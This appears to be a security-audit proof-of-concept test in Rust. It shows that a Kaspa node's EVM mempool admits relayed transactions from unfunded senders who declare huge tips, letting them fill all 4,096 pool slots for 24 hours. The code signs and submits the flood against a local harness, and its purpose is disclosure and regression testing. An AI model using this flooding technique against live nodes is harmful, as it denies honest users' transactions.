//! MSK-26A-NET-07 — The EVM mempool evicts and selects by a DECLARED effective tip without
//! checking the sender's balance on the P2P relay path, so unfunded senders can squat every
//! pool slot (EVM_MEMPOOL_MAX_TXS = 4,096) for the 86,400 s TTL at no cost.
//!
//! Audit commit : 3d2bd6dc5d77d37396d1b73c4c13526090923b92
//! Crate        : kaspa-mining (mining/), with its `evm` feature (kaspad's default feature set
//!                forwards `kaspa-mining/evm`, kaspad/Cargo.toml:93,99)
//! Command      :
//!   mkdir -p mining/tests && \
//!   cp docs/security/audits/2026-09-claude-pre-freeze/poc/MSK-26A-NET-07.rs mining/tests/audit_poc_msk_26a_net_07.rs && \
//!   cargo test -p kaspa-mining --features evm --test audit_poc_msk_26a_net_07 -- --nocapture ; \
//!   rm mining/tests/audit_poc_msk_26a_net_07.rs && rmdir mining/tests
//!
//! PASS = the vulnerable behaviour is present:
//!   * 16 unfunded secp256k1 senders x 256 real signed EIP-1559 txs (tip = max_fee = 2^100) are
//!     all admitted through `MiningManagerProxy::submit_evm_transaction` — the exact call the P2P
//!     relay makes (protocol/flows/src/v8/txrelay_evm.rs:174) — filling the pool to 4,096;
//!   * the same kind of unfunded tx IS refused (`Unaffordable`) on the RPC stateful path, so the
//!     balance rule exists but is not applied to relay ingress;
//!   * afterwards a FUNDED honest tx (100 gwei tip) is refused `Full` on both the RPC stateful path
//!     and the relay path, although on an empty pool it is admitted and selected;
//!   * `maintain_evm_pool` (prune against committed nonces) removes none of the squatters;
//!   * the block-template path (`get_block_template` -> `build_evm_template_data` ->
//!     `select_candidates`) selects NONE of them (committed balance 0 < gas reservation), so they
//!     never execute and never pay; only the 86,400 s TTL removes them.
//! Once relay admission applies an affordability check (or eviction ranks unaffordable senders
//! at tip 0), the relay submissions or the `Full` assertions fail and this test FAILS.

#[cfg(not(feature = "evm"))]
compile_error!("MSK-26A-NET-07 PoC must be run with `--features evm` (the kaspad default build enables it)");

use kaspa_consensus_core::{
    api::ConsensusApi,
    block::{BlockTemplate, TemplateBuildMode, TemplateTransactionSelectorFactory, VirtualStateApproxId},
    coinbase::MinerData,
    config::params::{mainnet_shipped_params, palw_t12_shipped_params},
    errors::{block::RuleError, consensus::ConsensusResult},
    evm::{EVM_CHAIN_ID, EVM_INITIAL_BASE_FEE, EvmAddress, EvmTemplateData},
    tx::ScriptPublicKey,
};
use kaspa_hashes::ZERO_HASH64;
use kaspa_mining::{
    MiningCounters,
    evm_mempool::{
        EVM_MEMPOOL_MAX_TXS, EVM_MEMPOOL_MAX_TXS_PER_SENDER, EVM_MEMPOOL_TX_TTL_SECS, EvmMempool, EvmMempoolError, PendingEvmTx,
    },
    manager::{MiningManager, MiningManagerProxy},
};
use secp256k1::{Message, SECP256K1, SecretKey};
use std::{collections::HashMap, sync::Arc, sync::Mutex, time::Instant};

// ------------------------------------------------------------------------------------------
// Minimal RLP + EIP-1559 signing (the mining crate's dev-deps have secp256k1 but no alloy).
// ------------------------------------------------------------------------------------------

fn be_min(x: u128) -> Vec<u8> {
    x.to_be_bytes().iter().copied().skip_while(|b| *b == 0).collect()
}
fn strip(b: &[u8]) -> Vec<u8> {
    b.iter().copied().skip_while(|x| *x == 0).collect()
}
fn rlp_prefix(short: u8, long: u8, len: usize) -> Vec<u8> {
    if len <= 55 {
        vec![short + len as u8]
    } else {
        let lb = be_min(len as u128);
        let mut v = vec![long + lb.len() as u8];
        v.extend(lb);
        v
    }
}
fn rlp_bytes(b: &[u8]) -> Vec<u8> {
    if b.len() == 1 && b[0] < 0x80 {
        return b.to_vec();
    }
    let mut out = rlp_prefix(0x80, 0xb7, b.len());
    out.extend_from_slice(b);
    out
}
fn rlp_uint(x: u128) -> Vec<u8> {
    rlp_bytes(&be_min(x))
}
fn rlp_list(items: &[Vec<u8>]) -> Vec<u8> {
    let payload: Vec<u8> = items.concat();
    let mut out = rlp_prefix(0xc0, 0xf7, payload.len());
    out.extend(payload);
    out
}
fn keccak(b: &[u8]) -> [u8; 32] {
    kaspa_evm::tx::tx_hash(b).as_bytes()
}

/// A canonical signed EIP-1559 value transfer (gas 21,000, no data, chain id EVM_CHAIN_ID).
/// The y-parity is picked by checking which one recovers `expected` (the secp256k1 dev-dep has no
/// `recovery` feature); the node's own admission recomputes everything from the raw bytes.
fn sign_1559(secret: &[u8; 32], expected: EvmAddress, nonce: u64, tip: u128, max_fee: u128) -> Vec<u8> {
    let to = [0x11u8; 20];
    let fields = vec![
        rlp_uint(EVM_CHAIN_ID as u128),
        rlp_uint(nonce as u128),
        rlp_uint(tip),
        rlp_uint(max_fee),
        rlp_uint(21_000),
        rlp_bytes(&to),
        rlp_uint(0),
        rlp_bytes(&[]),
        rlp_list(&[]),
    ];
    let mut preimage = vec![0x02u8];
    preimage.extend(rlp_list(&fields));
    let sk = SecretKey::from_slice(secret).expect("valid scalar");
    let sig = SECP256K1.sign_ecdsa(&Message::from_digest(keccak(&preimage)), &sk).serialize_compact();
    let (r, s) = (strip(&sig[..32]), strip(&sig[32..]));
    for parity in [0u128, 1] {
        let mut f = fields.clone();
        f.push(rlp_uint(parity));
        f.push(rlp_bytes(&r));
        f.push(rlp_bytes(&s));
        let mut raw = vec![0x02u8];
        raw.extend(rlp_list(&f));
        if let Ok(info) = kaspa_evm::tx::admit_tx_info(&raw) {
            if info.sender == expected {
                return raw;
            }
        }
    }
    panic!("could not produce a signature recovering to the expected sender");
}

fn addr_of(secret: &[u8; 32]) -> EvmAddress {
    EvmAddress::from_bytes(kaspa_evm::tx::evm_address_of_secret_v1(secret).expect("scalar in 1..n"))
}

// ------------------------------------------------------------------------------------------
// A ConsensusApi view of the committed EVM state: only the honest account exists (the attacker
// keys were never funded, so they are absent from the snapshot — exactly what
// `get_evm_account_states` returns for them). The template call captures the EVM candidates
// the mining manager selected and then aborts the build with a sentinel error.
// ------------------------------------------------------------------------------------------

struct CommittedEvmView {
    accounts: HashMap<EvmAddress, (u64, u128)>,
    captured: Mutex<Option<Vec<Vec<u8>>>>,
}

impl ConsensusApi for CommittedEvmView {
    fn get_virtual_state_approx_id(&self) -> VirtualStateApproxId {
        VirtualStateApproxId::new(1, 0u64.into(), ZERO_HASH64)
    }

    fn get_evm_account_states(&self, addresses: &[EvmAddress]) -> ConsensusResult<HashMap<EvmAddress, (u64, u128)>> {
        Ok(addresses.iter().filter_map(|a| self.accounts.get(a).map(|st| (*a, *st))).collect())
    }

    fn build_block_template_with_evm_selector_factory(
        &self,
        _miner_data: MinerData,
        _tx_selector_factory: &dyn TemplateTransactionSelectorFactory,
        _build_mode: TemplateBuildMode,
        evm_template_data: EvmTemplateData,
    ) -> Result<BlockTemplate, RuleError> {
        *self.captured.lock().unwrap() = Some(evm_template_data.transactions);
        Err(RuleError::WrongBlockVersion(0, 0)) // sentinel: we only need the selected EVM candidates
    }
}

fn new_manager() -> MiningManagerProxy {
    MiningManagerProxy::new(Arc::new(MiningManager::new(1_000, false, 500_000, None, Arc::new(MiningCounters::default()))))
}

/// The RPC ingress as `FlowContext::submit_rpc_evm_transaction` performs it (flow_context.rs:1908-1966):
/// recover the sender, read its committed (nonce, balance) — absent account => (0, 0) — then the
/// STATEFUL submit.
fn rpc_submit(mgr: &MiningManagerProxy, view: &CommittedEvmView, raw: Vec<u8>) -> Result<kaspa_hashes::EvmH256, EvmMempoolError> {
    let sender = mgr.evm_recover_sender(&raw)?;
    let st = view.accounts.get(&sender).copied().unwrap_or((0, 0));
    mgr.submit_evm_transaction_with_state(raw, Some(st))
}

/// The P2P relay ingress: `RelayEvmTransactionsFlow::receive_transactions` calls exactly this
/// (protocol/flows/src/v8/txrelay_evm.rs:174) — the stateless submit, `insert_with_state(tx, None)`.
fn relay_submit(mgr: &MiningManagerProxy, raw: Vec<u8>) -> Result<kaspa_hashes::EvmH256, EvmMempoolError> {
    mgr.submit_evm_transaction(raw)
}

#[test]
fn msk_26a_net_07_unfunded_relay_senders_squat_the_evm_pool() {
    // ---- reachability probe on the shipped parameter constructors ----
    let t12 = palw_t12_shipped_params();
    let main = mainnet_shipped_params();
    println!("[probe] evm_activation_daa_score: testnet-12 shipped = {}, mainnet shipped = {}", t12.evm_activation_daa_score, main.evm_activation_daa_score);
    assert_eq!(t12.evm_activation_daa_score, 0, "EVM lane active from DAA 0 on testnet-12");

    let honest_secret = [0x77u8; 32];
    let honest = addr_of(&honest_secret);
    let view = CommittedEvmView { accounts: HashMap::from([(honest, (0u64, 1_000_000_000_000_000_000u128))]), captured: Mutex::new(None) };
    let gwei: u128 = 1_000_000_000;
    let honest_raw = sign_1559(&honest_secret, honest, 0, 100 * gwei, 200 * gwei);
    let miner_data = MinerData::new(ScriptPublicKey::from_vec(0, vec![]), vec![]);

    // ---- control: on an empty pool the funded honest tx is admitted (RPC) and selected ----
    let control_inner = Arc::new(MiningManager::new(1_000, false, 500_000, None, Arc::new(MiningCounters::default())));
    let control = MiningManagerProxy::new(control_inner.clone());
    rpc_submit(&control, &view, honest_raw.clone()).expect("control: funded honest tx admitted on an empty pool");
    let _ = control_inner.get_block_template(&view, &miner_data);
    let control_selected = view.captured.lock().unwrap().take().expect("template path reached");
    println!("[control] honest funded tx admitted; template selected {} EVM tx(s)", control_selected.len());
    assert_eq!(control_selected, vec![honest_raw.clone()]);

    // ---- contrast: the RPC stateful path refuses an unfunded high-tip tx ----
    let probe_secret = [0x55u8; 32];
    let probe_raw = sign_1559(&probe_secret, addr_of(&probe_secret), 0, 1u128 << 100, 1u128 << 100);
    let rpc_verdict = rpc_submit(&new_manager(), &view, probe_raw);
    println!("[contrast] RPC stateful path, unfunded sender, tip 2^100: {rpc_verdict:?}");
    assert!(matches!(rpc_verdict, Err(EvmMempoolError::Unaffordable { .. })));

    // ---- attack: 16 unfunded senders x 256 txs, tip = max_fee = 2^100, via the RELAY call ----
    let attacked_inner = Arc::new(MiningManager::new(1_000, false, 500_000, None, Arc::new(MiningCounters::default())));
    let attacked = MiningManagerProxy::new(attacked_inner.clone());
    let n_senders = EVM_MEMPOOL_MAX_TXS / EVM_MEMPOOL_MAX_TXS_PER_SENDER;
    assert_eq!(n_senders, 16);
    let fee = 1u128 << 100;
    let started = Instant::now();
    let mut squatters: Vec<(EvmAddress, Vec<u8>)> = Vec::with_capacity(EVM_MEMPOOL_MAX_TXS);
    for i in 0..n_senders {
        let secret = [0x10u8 + i as u8; 32];
        let sender = addr_of(&secret);
        assert!(!view.accounts.contains_key(&sender), "attacker keys are unfunded");
        for nonce in 0..EVM_MEMPOOL_MAX_TXS_PER_SENDER as u64 {
            let raw = sign_1559(&secret, sender, nonce, fee, fee);
            relay_submit(&attacked, raw.clone()).unwrap_or_else(|e| panic!("relay admission refused squatter {i}/{nonce}: {e}"));
            squatters.push((sender, raw));
        }
    }
    println!(
        "[attack] relay path admitted {} txs from {} unfunded senders in {:?}; pool len = {} (cap {})",
        squatters.len(),
        n_senders,
        started.elapsed(),
        attacked_inner.evm_mempool_len(),
        EVM_MEMPOOL_MAX_TXS
    );
    assert_eq!(attacked_inner.evm_mempool_len(), EVM_MEMPOOL_MAX_TXS);
    assert_eq!(attacked.evm_pending_hashes().len(), EVM_MEMPOOL_MAX_TXS, "all squatters are re-announced by the relay tick");

    // ---- the same funded honest tx is now refused Full on BOTH ingress paths ----
    let rpc_after = rpc_submit(&attacked, &view, honest_raw.clone());
    let relay_after = relay_submit(&attacked, honest_raw.clone());
    println!("[attack] funded honest tx (100 gwei tip): RPC stateful -> {rpc_after:?}; relay -> {relay_after:?}");
    assert!(matches!(rpc_after, Err(EvmMempoolError::Full { .. })));
    assert!(matches!(relay_after, Err(EvmMempoolError::Full { .. })));

    // ---- pool maintenance (TTL + prune against committed nonces) removes none of them ----
    attacked_inner.maintain_evm_pool(&view);
    println!("[attack] after maintain_evm_pool: pool len = {}", attacked_inner.evm_mempool_len());
    assert_eq!(attacked_inner.evm_mempool_len(), EVM_MEMPOOL_MAX_TXS);

    // ---- the template path selects none of the squatters (balance 0 < gas reservation) ----
    let _ = attacked_inner.get_block_template(&view, &miner_data);
    let selected = view.captured.lock().unwrap().take().expect("template path reached");
    println!("[attack] template selected {} EVM tx(s) out of {} pending", selected.len(), attacked_inner.evm_mempool_len());
    assert!(selected.is_empty(), "no squatter is ever selected, so none ever executes or pays");
    assert_eq!(attacked_inner.evm_mempool_len(), EVM_MEMPOOL_MAX_TXS, "template build removes none either");

    // ---- only the TTL removes a squatter: kept at added_at + 86,400 s, dropped one second later ----
    assert_eq!(EVM_MEMPOOL_TX_TTL_SECS, 86_400);
    let (sq_sender, sq_raw) = squatters[0].clone();
    let info = kaspa_evm::tx::admit_tx_info(&sq_raw).unwrap();
    let t0 = 1_000_000u64;
    let mut pool = EvmMempool::new();
    pool.set_base_fee(EVM_INITIAL_BASE_FEE as u128);
    pool.insert_with_state(
        PendingEvmTx {
            hash: info.hash,
            sender: sq_sender,
            nonce: info.nonce,
            gas_limit: info.gas_limit,
            max_fee_per_gas: info.max_fee_per_gas,
            max_priority_fee_per_gas: info.max_priority_fee_per_gas,
            raw: sq_raw,
            added_at: t0,
        },
        None,
    )
    .unwrap();
    pool.prune_below_state_nonce(&HashMap::from([(sq_sender, 0u64)]));
    pool.expire(t0 + EVM_MEMPOOL_TX_TTL_SECS);
    let kept_at_ttl = pool.len();
    pool.expire(t0 + EVM_MEMPOOL_TX_TTL_SECS + 1);
    println!("[ttl] squatter kept at +86400 s: {}; after +86401 s: {}", kept_at_ttl == 1, pool.is_empty());
    assert_eq!(kept_at_ttl, 1);
    assert!(pool.is_empty());

    println!("MSK-26A-NET-07: VULNERABLE BEHAVIOUR PRESENT (unfunded relay squatters block funded EVM txs until TTL)");
}
